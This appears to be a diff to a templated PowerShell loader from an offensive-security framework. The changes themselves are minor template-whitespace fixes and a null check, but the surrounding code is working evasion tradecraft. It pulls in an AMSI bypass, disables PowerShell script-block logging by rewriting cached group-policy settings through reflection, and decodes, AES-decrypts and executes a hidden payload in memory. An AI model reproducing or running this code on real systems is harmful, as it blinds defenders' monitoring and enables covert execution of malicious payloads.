@@ -1,9 +1,9 @@
 {#- At this point, we assume AMSI is disabled -#}
 {#- Load process-specific AMSI bypass -#}
 
-{%- include "powershell/amsi/process.ps1" -%}
+{%- include "powershell/amsi/process.ps1" %}
 
-{#- Bypass PowerShell Logging: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/ -#}
+{# Bypass PowerShell Logging: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/ -#}
 $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
@@ -59,6 +59,7 @@ function Decrypt-AES {
 function {{symbol_name("Unpack")}} {
     $Result = [System.Convert]::FromBase64String($args[0])
     $Result = Decrypt-AES $Result $KEY
+    if (-not $Result) {return}
     $Result = [System.Text.Encoding]::UTF8.GetString($Result)
     $sb = [Scriptblock]::Create($Result)
     New-Module -ScriptBlock $sb | Out-Null
